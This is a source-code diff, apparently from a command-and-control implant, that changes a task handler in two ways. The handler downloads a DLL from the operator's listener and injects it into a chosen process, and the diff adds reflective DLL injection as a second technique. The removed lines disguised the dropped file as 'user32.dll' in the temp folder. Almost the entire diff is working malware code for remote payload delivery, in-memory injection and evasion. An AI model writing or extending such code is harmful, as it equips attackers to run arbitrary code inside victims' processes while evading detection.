@@ -3,19 +3,17 @@
 namespace Task
 {
     // Load DLL and spawn modules.
-    std::wstring Dll(State::PSTATE pState, const std::wstring& wPid, const std::wstring& wSrc)
-    {
+    std::wstring Dll(
+        State::PSTATE pState,
+        const std::wstring& wPid,
+        const std::wstring& wSrc,
+        const std::wstring& wTechnique
+    ) {
         DWORD dwPid = Utils::Convert::WstringToDWORD(wPid, 10);
 
-        // Set the DLL file path to inject
-        std::wstring wDllDestName = L"user32.dll"; // Impersonate the file name.
-        std::wstring wDllDest = System::Env::EnvStringsGet(pState->pProcs, L"%TEMP%") + L"\\" + wDllDestName;
-        size_t dwDllDestSize = (wDllDest.size() + 1) * sizeof(wchar_t);
-
+        // Download DLL
         std::wstring wHeaders = L"X-UUID: " + pState->wUUID + L"\r\n";
-
-        // Download a DLL file
-        if (!System::Http::FileDownload(
+        std::vector<BYTE> bytes = System::Http::DataDownload(
             pState->pProcs,
             pState->pCrypt,
             pState->hConnect,
@@ -23,16 +21,31 @@ namespace Task
             pState->nListenerPort,
             pState->lpReqPathDownload,
             wHeaders.c_str(),
-            wSrc,
-            wDllDest
-        )) {
-            return L"Error: Failed to download DLL file.";
+            wSrc
+        );
+        if (bytes.size() == 0)
+        {
+            return L"Error: Failed to get DLL.";
         }
 
         // Inject DLL
-        if (!Technique::Injection::DllInjection(pState->pProcs, dwPid, (LPVOID)wDllDest.c_str(), dwDllDestSize))
+        if (wcscmp(wTechnique.c_str(), L"dll-injection") == 0)
         {
-            return L"Error: Failed to inject DLL.";
+            if (!Technique::Injection::DllInjection(pState->pProcs, dwPid, bytes))
+            {
+                return L"Error: Failed to inject DLL.";
+            }
+        }
+        else if (wcscmp(wTechnique.c_str(), L"reflective-dll-injection") == 0)
+        {
+            if (!Technique::Injection::ReflectiveDLLInjection(pState->pProcs, dwPid, bytes))
+            {
+                return L"Error: Failed to inject DLL.";
+            }
+        }
+        else
+        {
+            return L"Error: Invalid technique.";
         }
 
         return L"Success: Dll injected successfully.";
